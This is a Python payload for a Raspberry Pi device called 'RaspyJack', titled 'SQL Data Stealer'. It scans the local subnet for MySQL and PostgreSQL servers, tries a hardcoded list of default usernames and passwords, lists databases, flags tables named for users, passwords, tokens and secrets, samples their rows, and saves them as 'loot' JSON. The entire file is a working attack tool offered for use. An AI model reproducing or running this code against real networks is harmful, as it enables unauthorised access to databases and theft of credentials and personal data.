#!/usr/bin/env python3
"""
RaspyJack Payload -- SQL Data Stealer
======================================
Connects to discovered MySQL/MariaDB or PostgreSQL servers,
enumerates databases/tables, samples interesting data, exports to loot.

Controls:
  OK         -- Connect / Select item
  UP / DOWN  -- Scroll
  KEY1       -- Cycle view (CONNECT / ENUM / DATA)
  KEY2       -- Export findings to loot
  LEFT       -- Back
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/SQLStealer/
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROW_H = 12
ROWS_VISIBLE = 6
LOOT_DIR = "/root/Raspyjack/loot/SQLStealer"
NMAP_LOOT = "/root/Raspyjack/loot"

INTERESTING_KEYWORDS = (
    "user", "pass", "cred", "email", "account", "admin",
    "token", "secret", "key", "login", "auth", "session",
    "api_key", "apikey", "hash", "salt", "role", "permission",
)

MYSQL_PORTS = (3306, 3307, 33060)
PG_PORTS = (5432, 5433)
ALL_PORTS = MYSQL_PORTS + PG_PORTS

DB_CREDS = [
    ("root", ""), ("root", "root"), ("root", "password"), ("root", "toor"),
    ("root", "mysql"), ("root", "123456"), ("admin", "admin"),
    ("admin", "password"), ("mysql", "mysql"), ("postgres", "postgres"),
    ("postgres", "password"), ("postgres", ""), ("dbuser", "dbuser"),
    ("sa", "sa"), ("sa", "password"), ("test", "test"),
]

VIEWS = ["CONNECT", "ENUM", "DATA"]

lock = threading.Lock()
running = True
scan_active = False
connect_active = False

hosts = []          # [{"ip": str, "port": int, "type": "mysql"|"postgres"}]
selected_idx = 0
scroll_offset = 0
view = "CONNECT"
status_msg = ""

connected_host = None
conn_type = None
databases = []
tables = []         # [{"db": str, "table": str, "interesting": bool}]
columns = []        # [{"name": str, "type": str}]
sample_rows = []    # [[val, ...]]
selected_db = None
selected_table = None

all_findings = []   # for loot export


def _detect_subnet():
    for iface in ("eth0", "wlan0"):
        try:
            res = subprocess.run(
                ["ip", "-4", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            )
            for line in res.stdout.splitlines():
                s = line.strip()
                if s.startswith("inet "):
                    return s.split()[1]
        except Exception:
            pass
    return None


def _scan_sql_hosts(cidr):
    found = []
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return found
    for host in network.hosts():
        if not running:
            break
        ip = str(host)
        for port in ALL_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.4)
                if sock.connect_ex((ip, port)) == 0:
                    db_type = "mysql" if port in MYSQL_PORTS else "postgres"
                    found.append({"ip": ip, "port": port, "type": db_type})
                sock.close()
            except Exception:
                pass
    return found


def _load_nmap_sql_hosts():
    result = []
    if not os.path.isdir(NMAP_LOOT):
        return result
    for dirpath, _dirs, files in os.walk(NMAP_LOOT):
        for fname in files:
            if not fname.endswith(".json"):
                continue
            try:
                with open(os.path.join(dirpath, fname)) as fh:
                    data = json.load(fh)
                _extract_sql_hosts(data, result)
            except Exception:
                pass
    return result


def _extract_sql_hosts(data, out):
    if isinstance(data, dict):
        port = str(data.get("port", data.get("portid", "")))
        state = str(data.get("state", ""))
        if port in ("3306", "3307", "5432", "5433") and "open" in state.lower():
            ip = data.get("ip", data.get("addr", data.get("host", "")))
            if ip:
                db_type = "mysql" if port.startswith("33") else "postgres"
                entry = {"ip": str(ip), "port": int(port), "type": db_type}
                if entry not in out:
                    out.append(entry)
        for v in data.values():
            _extract_sql_hosts(v, out)
    elif isinstance(data, list):
        for item in data:
            _extract_sql_hosts(item, out)


def _scan_thread():
    global scan_active, status_msg
    scan_active = True
    found = []
    with lock:
        status_msg = "Loading nmap loot..."
    found.extend(_load_nmap_sql_hosts())
    cidr = _detect_subnet()
    if cidr and running:
        with lock:
            status_msg = "Scanning subnet..."
        found.extend(_scan_sql_hosts(cidr))
    seen = set()
    deduped = []
    for h in found:
        key = (h["ip"], h["port"])
        if key not in seen:
            seen.add(key)
            deduped.append(h)
    with lock:
        hosts.clear()
        hosts.extend(deduped)
        status_msg = f"Found {len(hosts)} SQL host(s)"
    scan_active = False


# ---------------------------------------------------------------------------
# MySQL helpers
# ---------------------------------------------------------------------------

def _mysql_query(host, port, user, passwd, query):
    try:
        import pymysql
        conn = pymysql.connect(
            host=host, port=port, user=user, password=passwd,
            connect_timeout=5, read_timeout=10,
        )
        cur = conn.cursor()
        cur.execute(query)
        rows = cur.fetchall()
        cols = [d[0] for d in cur.description] if cur.description else []
        cur.close()
        conn.close()
        return cols, rows
    except ImportError:
        pass
    except Exception as e:
        raise e
    cmd = ["mysql", "-h", host, "-P", str(port), "-u", user,
           f"-p{passwd}", "-N", "-B", "-e", query]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    if r.returncode != 0:
        raise RuntimeError(r.stderr.strip()[:100])
    lines = [l for l in r.stdout.strip().splitlines() if l]
    if not lines:
        return [], []
    rows = [tuple(l.split("\t")) for l in lines]
    return [], rows


def _mysql_connect(host, port):
    for user, passwd in DB_CREDS:
        try:
            _mysql_query(host, port, user, passwd, "SELECT 1")
            return user, passwd
        except Exception:
            continue
    return None, None


def _mysql_enum_databases(host, port, user, passwd):
    _, rows = _mysql_query(host, port, user, passwd, "SHOW DATABASES")
    skip = {"information_schema", "performance_schema", "sys", "mysql"}
    return [r[0] for r in rows if r[0] not in skip]


def _mysql_enum_tables(host, port, user, passwd, db):
    _, rows = _mysql_query(host, port, user, passwd,
                           f"SHOW TABLES FROM `{db}`")
    result = []
    for r in rows:
        name = r[0]
        interesting = any(k in name.lower() for k in INTERESTING_KEYWORDS)
        result.append({"db": db, "table": name, "interesting": interesting})
    return result


def _mysql_sample(host, port, user, passwd, db, table, limit=20):
    q = f"SELECT * FROM `{db}`.`{table}` LIMIT {limit}"
    cols, rows = _mysql_query(host, port, user, passwd, q)
    if not cols:
        cq = (f"SELECT COLUMN_NAME FROM information_schema.COLUMNS "
              f"WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{table}'")
        _, cr = _mysql_query(host, port, user, passwd, cq)
        cols = [c[0] for c in cr]
    return cols, rows


# ---------------------------------------------------------------------------
# PostgreSQL helpers
# ---------------------------------------------------------------------------

def _pg_query(host, port, user, passwd, query, dbname="postgres"):
    try:
        import psycopg2
        conn = psycopg2.connect(
            host=host, port=port, user=user, password=passwd,
            dbname=dbname, connect_timeout=5,
        )
        conn.autocommit = True
        cur = conn.cursor()
        cur.execute(query)
        cols = [d[0] for d in cur.description] if cur.description else []
        rows = cur.fetchall()
        cur.close()
        conn.close()
        return cols, rows
    except ImportError:
        pass
    except Exception as e:
        raise e
    env = dict(os.environ, PGPASSWORD=passwd)
    cmd = ["psql", "-h", host, "-p", str(port), "-U", user,
           "-d", dbname, "-t", "-A", "-F", "\t", "-c", query]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15, env=env)
    if r.returncode != 0:
        raise RuntimeError(r.stderr.strip()[:100])
    lines = [l for l in r.stdout.strip().splitlines() if l]
    rows = [tuple(l.split("\t")) for l in lines]
    return [], rows


def _pg_connect(host, port):
    for user, passwd in DB_CREDS:
        try:
            _pg_query(host, port, user, passwd, "SELECT 1")
            return user, passwd
        except Exception:
            continue
    return None, None


def _pg_enum_databases(host, port, user, passwd):
    _, rows = _pg_query(host, port, user, passwd,
                        "SELECT datname FROM pg_database WHERE datistemplate=false")
    skip = {"template0", "template1"}
    return [r[0] for r in rows if r[0] not in skip]


def _pg_enum_tables(host, port, user, passwd, db):
    q = ("SELECT tablename FROM pg_tables "
         "WHERE schemaname NOT IN ('pg_catalog','information_schema')")
    _, rows = _pg_query(host, port, user, passwd, q, dbname=db)
    result = []
    for r in rows:
        name = r[0]
        interesting = any(k in name.lower() for k in INTERESTING_KEYWORDS)
        result.append({"db": db, "table": name, "interesting": interesting})
    return result


def _pg_sample(host, port, user, passwd, db, table, limit=20):
    q = f'SELECT * FROM "{table}" LIMIT {limit}'
    cols, rows = _pg_query(host, port, user, passwd, q, dbname=db)
    if not cols:
        cq = ("SELECT column_name FROM information_schema.columns "
              f"WHERE table_name='{table}' AND table_schema='public'")
        _, cr = _pg_query(host, port, user, passwd, cq, dbname=db)
        cols = [c[0] for c in cr]
    return cols, rows


# ---------------------------------------------------------------------------
# Connection thread
# ---------------------------------------------------------------------------

_conn_user = None
_conn_pass = None

def _connect_thread(host_entry):
    global connect_active, status_msg, connected_host, conn_type
    global databases, tables, columns, sample_rows, view
    global _conn_user, _conn_pass, selected_db, selected_table
    connect_active = True
    ip = host_entry["ip"]
    port = host_entry["port"]
    db_type = host_entry["type"]

    with lock:
        status_msg = f"Trying creds on {ip}..."

    if db_type == "mysql":
        user, passwd = _mysql_connect(ip, port)
    else:
        user, passwd = _pg_connect(ip, port)

    if user is None:
        with lock:
            status_msg = "Auth failed - no creds"
            connect_active = False
        return

    _conn_user, _conn_pass = user, passwd
    with lock:
        connected_host = host_entry
        conn_type = db_type
        status_msg = f"Connected as {user}"

    try:
        if db_type == "mysql":
            dbs = _mysql_enum_databases(ip, port, user, passwd)
        else:
            dbs = _pg_enum_databases(ip, port, user, passwd)
        with lock:
            databases.clear()
            databases.extend(dbs)
            tables.clear()
            columns.clear()
            sample_rows.clear()
            selected_db = None
            selected_table = None
            view = "ENUM"
            status_msg = f"{len(dbs)} database(s)"
    except Exception as e:
        with lock:
            status_msg = f"Enum err: {str(e)[:30]}"
    connect_active = False


def _enum_tables_for_db(db):
    global status_msg
    ip = connected_host["ip"]
    port = connected_host["port"]
    with lock:
        status_msg = f"Listing {db}..."
    try:
        if conn_type == "mysql":
            tbs = _mysql_enum_tables(ip, port, _conn_user, _conn_pass, db)
        else:
            tbs = _pg_enum_tables(ip, port, _conn_user, _conn_pass, db)
        with lock:
            tables.clear()
            tables.extend(tbs)
            status_msg = f"{len(tbs)} table(s) in {db}"
    except Exception as e:
        with lock:
            status_msg = f"Err: {str(e)[:30]}"


def _sample_table(db, table):
    global status_msg, columns, sample_rows
    ip = connected_host["ip"]
    port = connected_host["port"]
    with lock:
        status_msg = f"Sampling {table}..."
    try:
        if conn_type == "mysql":
            cols, rows = _mysql_sample(ip, port, _conn_user, _conn_pass, db, table)
        else:
            cols, rows = _pg_sample(ip, port, _conn_user, _conn_pass, db, table)
        with lock:
            columns.clear()
            columns.extend([{"name": c, "type": ""} for c in cols])
            sample_rows.clear()
            sample_rows.extend([list(r) for r in rows])
            status_msg = f"{len(rows)} row(s)"

        if rows:
            finding = {
                "host": ip, "port": port, "type": conn_type,
                "user": _conn_user, "db": db, "table": table,
                "columns": cols,
                "sample": [list(str(v) for v in r) for r in rows[:10]],
            }
            with lock:
                all_findings.append(finding)
    except Exception as e:
        with lock:
            status_msg = f"Err: {str(e)[:30]}"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"sql_loot_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "findings": list(all_findings),
            "hosts_scanned": [h.copy() for h in hosts],
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "SQL STEALER", font=font, fill="#FF6600")
    indicator = "#00FF00" if (scan_active or connect_active) else "#444"
    d.ellipse((118, 3, 122, 7), fill=indicator)

    with lock:
        host_list = list(hosts)
        db_list = list(databases)
        tbl_list = list(tables)
        col_list = list(columns)
        rows_list = list(sample_rows)
        msg = status_msg
        cur_view = view
        cur_db = selected_db
        cur_tbl = selected_table

    if cur_view == "CONNECT":
        d.text((2, 16), f"SQL Hosts: {len(host_list)}", font=font, fill="#AAA")
        visible = host_list[scroll_offset:scroll_offset + ROWS_VISIBLE]
        for i, h in enumerate(visible):
            y = 28 + i * ROW_H
            ridx = scroll_offset + i
            prefix = ">" if ridx == selected_idx else " "
            color = "#00FF00" if ridx == selected_idx else "#CCC"
            label = f"{h['ip']}:{h['port']} {h['type'][0].upper()}"
            d.text((2, y), f"{prefix}{label}", font=font, fill=color)

    elif cur_view == "ENUM":
        if cur_db is None:
            d.text((2, 16), f"Databases: {len(db_list)}", font=font, fill="#AAA")
            visible = db_list[scroll_offset:scroll_offset + ROWS_VISIBLE]
            for i, db in enumerate(visible):
                y = 28 + i * ROW_H
                ridx = scroll_offset + i
                prefix = ">" if ridx == selected_idx else " "
                color = "#00FF00" if ridx == selected_idx else "#CCC"
                d.text((2, y), f"{prefix}{db}", font=font, fill=color)
        else:
            d.text((2, 16), f"{cur_db}: {len(tbl_list)} tbl", font=font, fill="#AAA")
            visible = tbl_list[scroll_offset:scroll_offset + ROWS_VISIBLE]
            for i, t in enumerate(visible):
                y = 28 + i * ROW_H
                ridx = scroll_offset + i
                prefix = ">" if ridx == selected_idx else " "
                color = "#FF4444" if t["interesting"] else "#CCC"
                if ridx == selected_idx:
                    color = "#00FF00"
                marker = "*" if t["interesting"] else " "
                d.text((2, y), f"{prefix}{marker}{t['table'][:18]}", font=font, fill=color)

    elif cur_view == "DATA":
        header = f"{cur_db}.{cur_tbl}" if cur_tbl else "No table"
        d.text((2, 16), header[:22], font=font, fill="#AAA")
        if col_list:
            col_names = ",".join(c["name"] for c in col_list)
            d.text((2, 27), col_names[:22], font=font, fill="#888")
        visible = rows_list[scroll_offset:scroll_offset + ROWS_VISIBLE - 1]
        for i, row in enumerate(visible):
            y = 38 + i * ROW_H
            ridx = scroll_offset + i
            color = "#00FF00" if ridx == selected_idx else "#CCC"
            text = " | ".join(str(v)[:10] for v in row[:4])
            d.text((2, y), text[:24], font=font, fill=color)

    if msg:
        d.text((2, 104), msg[:24], font=font, fill="#FFAA00")

    d.rectangle((0, 116, 127, 127), fill="#111")
    if scan_active:
        d.text((2, 117), "Scanning...", font=font, fill="#888")
    elif connect_active:
        d.text((2, 117), "Connecting...", font=font, fill="#888")
    else:
        hints = {"CONNECT": "OK:Go K1:Scan K3:Quit",
                 "ENUM": "OK:Sel <:Bk K2:Loot",
                 "DATA": "OK:Samp <:Bk K2:Loot"}
        d.text((2, 117), hints.get(cur_view, ""), font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, selected_idx, scroll_offset, view, status_msg
    global selected_db, selected_table

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 20), "SQL DATA STEALER", font=font, fill="#FF6600")
    d.text((4, 40), "Discover & sample", font=font, fill="#888")
    d.text((4, 52), "MySQL / PostgreSQL", font=font, fill="#888")
    d.text((4, 72), "OK    Connect", font=font, fill="#666")
    d.text((4, 84), "KEY1  Scan hosts", font=font, fill="#666")
    d.text((4, 96), "KEY3  Exit", font=font, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(2)

    threading.Thread(target=_scan_thread, daemon=True).start()

    try:
        while running:
            _draw_frame(lcd, font)
            btn = get_button(PINS, timeout=0.15)
            if not btn:
                continue

            if btn == "KEY3":
                running = False
                break

            if scan_active or connect_active:
                continue

            if btn == "KEY1":
                if view == "CONNECT":
                    threading.Thread(target=_scan_thread, daemon=True).start()
                else:
                    idx = VIEWS.index(view)
                    view = VIEWS[(idx + 1) % len(VIEWS)]
                    selected_idx = 0
                    scroll_offset = 0

            elif btn == "KEY2":
                if all_findings:
                    fname = _export_loot()
                    with lock:
                        status_msg = f"Saved {fname}"
                else:
                    with lock:
                        status_msg = "No data to export"

            elif btn == "UP":
                if selected_idx > 0:
                    selected_idx -= 1
                    if selected_idx < scroll_offset:
                        scroll_offset = selected_idx

            elif btn == "DOWN":
                max_idx = 0
                if view == "CONNECT":
                    max_idx = len(hosts) - 1
                elif view == "ENUM":
                    if selected_db is None:
                        max_idx = len(databases) - 1
                    else:
                        max_idx = len(tables) - 1
                elif view == "DATA":
                    max_idx = len(sample_rows) - 1
                if selected_idx < max_idx:
                    selected_idx += 1
                    if selected_idx >= scroll_offset + ROWS_VISIBLE:
                        scroll_offset = selected_idx - ROWS_VISIBLE + 1

            elif btn == "LEFT":
                if view == "DATA":
                    view = "ENUM"
                    selected_idx = 0
                    scroll_offset = 0
                elif view == "ENUM" and selected_db is not None:
                    selected_db = None
                    selected_table = None
                    selected_idx = 0
                    scroll_offset = 0
                elif view == "ENUM":
                    view = "CONNECT"
                    selected_idx = 0
                    scroll_offset = 0

            elif btn == "OK":
                if view == "CONNECT" and hosts:
                    idx = min(selected_idx, len(hosts) - 1)
                    threading.Thread(
                        target=_connect_thread, args=(hosts[idx],), daemon=True
                    ).start()

                elif view == "ENUM":
                    if selected_db is None and databases:
                        idx = min(selected_idx, len(databases) - 1)
                        selected_db = databases[idx]
                        selected_idx = 0
                        scroll_offset = 0
                        threading.Thread(
                            target=_enum_tables_for_db, args=(selected_db,),
                            daemon=True
                        ).start()
                    elif selected_db and tables:
                        idx = min(selected_idx, len(tables) - 1)
                        tbl = tables[idx]
                        selected_table = tbl["table"]
                        view = "DATA"
                        selected_idx = 0
                        scroll_offset = 0
                        threading.Thread(
                            target=_sample_table,
                            args=(tbl["db"], tbl["table"]),
                            daemon=True
                        ).start()

                elif view == "DATA" and sample_rows:
                    pass

    except KeyboardInterrupt:
        pass
    finally:
        running = False
        lcd.LCD_Clear()
        GPIO.cleanup()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
